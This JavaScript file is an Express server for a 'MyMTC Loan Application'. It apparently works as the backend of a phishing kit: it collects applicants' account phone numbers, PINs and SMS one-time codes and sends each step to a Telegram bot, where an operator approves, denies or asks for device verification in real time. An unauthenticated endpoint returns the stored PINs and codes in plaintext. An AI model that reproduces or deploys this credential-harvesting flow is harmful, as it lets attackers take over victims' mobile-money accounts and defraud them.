const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();
const twilio = require('twilio');
const crypto = require('crypto');

const app = express();

// Middleware
app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// In-memory storage (for production, use MongoDB)
const sessions = new Map();
const pendingApprovals = new Map();

// Twilio Client
const twilioClient = twilio(
  process.env.TWILIO_ACCOUNT_SID,
  process.env.TWILIO_AUTH_TOKEN
);

// Utility Functions
function generateSessionId() {
  return 'SESSION_' + crypto.randomBytes(16).toString('hex');
}

function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function generatePIN() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

// Store telegram bot instance (will be injected)
let telegramBot = null;

function setTelegramBot(bot) {
  telegramBot = bot;
}

// Send OTP via SMS
async function sendOTP(phoneNumber, otp) {
  try {
    await twilioClient.messages.create({
      body: `Your MyMTC Loan Application OTP is: ${otp}. Valid for 2 minutes.`,
      from: process.env.TWILIO_PHONE_NUMBER,
      to: phoneNumber,
    });
    console.log(`OTP sent to ${phoneNumber}`);
    return true;
  } catch (error) {
    console.error('Error sending OTP:', error);
    return false;
  }
}

// API Routes

// 1. Submit Loan Application
app.post('/api/loan/apply', async (req, res) => {
  try {
    const { fullName, phoneNumber, loanAmount, loanPurpose } = req.body;

    // Validation
    if (!fullName || !phoneNumber || !loanAmount || !loanPurpose) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    // Create session
    const sessionId = generateSessionId();
    const session = {
      sessionId,
      fullName,
      phoneNumber,
      loanAmount,
      loanPurpose,
      status: 'pending',
      createdAt: new Date(),
      stage: 'application_submitted',
    };

    sessions.set(sessionId, session);

    // Notify Telegram bot
    if (telegramBot) {
      telegramBot.notifyNewApplication(session);
    }

    console.log('New loan application:', session);

    res.json({
      sessionId,
      message: 'Application submitted successfully',
    });
  } catch (error) {
    console.error('Error in /api/loan/apply:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 2. Submit Login (Phone & PIN)
app.post('/api/loan/verify-login', async (req, res) => {
  try {
    const { sessionId, phoneNumber, pin } = req.body;

    if (!sessionId || !phoneNumber || !pin) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (!sessions.has(sessionId)) {
      return res.status(404).json({ message: 'Session not found' });
    }

    const session = sessions.get(sessionId);
    session.loginPhone = phoneNumber;
    session.loginPin = pin;
    session.stage = 'login_submitted';
    session.status = 'awaiting_login_approval';

    // Generate OTP
    const otp = generateOTP();
    session.otp = otp;
    session.otpExpiry = Date.now() + 2 * 60 * 1000; // 2 minutes

    // Send OTP via SMS
    const otpSent = await sendOTP(phoneNumber, otp);
    if (!otpSent) {
      return res.status(500).json({ message: 'Failed to send OTP' });
    }

    sessions.set(sessionId, session);

    // Store pending approval for Telegram bot
    pendingApprovals.set(sessionId, {
      type: 'login',
      data: session,
      createdAt: new Date(),
    });

    // Notify Telegram bot
    if (telegramBot) {
      telegramBot.notifyLoginSubmission(session);
    }

    console.log('Login submitted, OTP sent to:', phoneNumber);

    res.json({
      sessionId,
      message: 'Login submitted. OTP sent to your phone.',
    });
  } catch (error) {
    console.error('Error in /api/loan/verify-login:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 3. Verify OTP
app.post('/api/loan/verify-otp', async (req, res) => {
  try {
    const { sessionId, otp } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (!sessions.has(sessionId)) {
      return res.status(404).json({ message: 'Session not found' });
    }

    const session = sessions.get(sessionId);

    // Check OTP validity
    if (session.otp !== otp) {
      return res.status(400).json({ message: 'Invalid OTP', status: 'wrong_otp' });
    }

    if (Date.now() > session.otpExpiry) {
      return res.status(400).json({ message: 'OTP expired', status: 'wrong_otp' });
    }

    session.stage = 'otp_submitted';
    session.status = 'awaiting_otp_approval';
    session.otpVerified = otp;

    sessions.set(sessionId, session);

    // Store pending approval for Telegram bot
    pendingApprovals.set(sessionId, {
      type: 'otp',
      data: session,
      createdAt: new Date(),
    });

    // Notify Telegram bot
    if (telegramBot) {
      telegramBot.notifyOTPSubmission(session);
    }

    console.log('OTP verification submitted for:', sessionId);

    res.json({
      sessionId,
      message: 'OTP submitted for verification',
    });
  } catch (error) {
    console.error('Error in /api/loan/verify-otp:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 4. Resend OTP
app.post('/api/loan/resend-otp', async (req, res) => {
  try {
    const { sessionId, phoneNumber } = req.body;

    if (!sessionId || !phoneNumber) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (!sessions.has(sessionId)) {
      return res.status(404).json({ message: 'Session not found' });
    }

    const session = sessions.get(sessionId);

    // Generate new OTP
    const otp = generateOTP();
    session.otp = otp;
    session.otpExpiry = Date.now() + 2 * 60 * 1000; // 2 minutes

    // Send OTP via SMS
    const otpSent = await sendOTP(phoneNumber, otp);
    if (!otpSent) {
      return res.status(500).json({ message: 'Failed to send OTP' });
    }

    sessions.set(sessionId, session);

    console.log('OTP resent to:', phoneNumber);

    res.json({
      message: 'OTP resent successfully',
    });
  } catch (error) {
    console.error('Error in /api/loan/resend-otp:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 5. Check Approval Status (Polling endpoint)
app.post('/api/loan/check-status', async (req, res) => {
  try {
    const { sessionId, stage } = req.body;

    if (!sessionId) {
      return res.status(400).json({ message: 'Missing sessionId' });
    }

    if (!sessions.has(sessionId)) {
      return res.status(404).json({ message: 'Session not found' });
    }

    const session = sessions.get(sessionId);

    res.json({
      status: session.status,
      stage: session.stage,
      reason: session.denialReason || null,
    });
  } catch (error) {
    console.error('Error in /api/loan/check-status:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 6. Telegram Bot Callback - Approve/Deny/Verify Device/Wrong OTP
app.post('/api/telegram-callback', async (req, res) => {
  try {
    const { sessionId, action, reason } = req.body;

    if (!sessionId || !action) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (!sessions.has(sessionId)) {
      return res.status(404).json({ message: 'Session not found' });
    }

    const session = sessions.get(sessionId);

    switch (action) {
      case 'approve_login':
        session.status = 'approved';
        session.stage = 'login_approved';
        break;

      case 'deny_login':
        session.status = 'denied';
        session.stage = 'login_denied';
        session.denialReason = reason || 'Login verification failed';
        break;

      case 'verify_device':
        session.status = 'verify_device';
        session.stage = 'verify_device_requested';
        break;

      case 'approve_otp':
        session.status = 'approved';
        session.stage = 'otp_approved';
        break;

      case 'wrong_otp':
        session.status = 'wrong_otp';
        session.stage = 'otp_wrong';
        break;

      default:
        return res.status(400).json({ message: 'Invalid action' });
    }

    sessions.set(sessionId, session);
    pendingApprovals.delete(sessionId);

    console.log(`Action ${action} applied to session:`, sessionId);

    res.json({
      message: `Action ${action} processed successfully`,
    });
  } catch (error) {
    console.error('Error in /api/telegram-callback:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// 7. Get Session Data (for admin/debugging)
app.get('/api/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;

  if (!sessions.has(sessionId)) {
    return res.status(404).json({ message: 'Session not found' });
  }

  res.json(sessions.get(sessionId));
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date() });
});

// Start Server
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}`);
  console.log(`CORS enabled for: ${process.env.FRONTEND_URL || 'all origins'}`);
});

module.exports = { app, server, setTelegramBot, sessions, pendingApprovals };
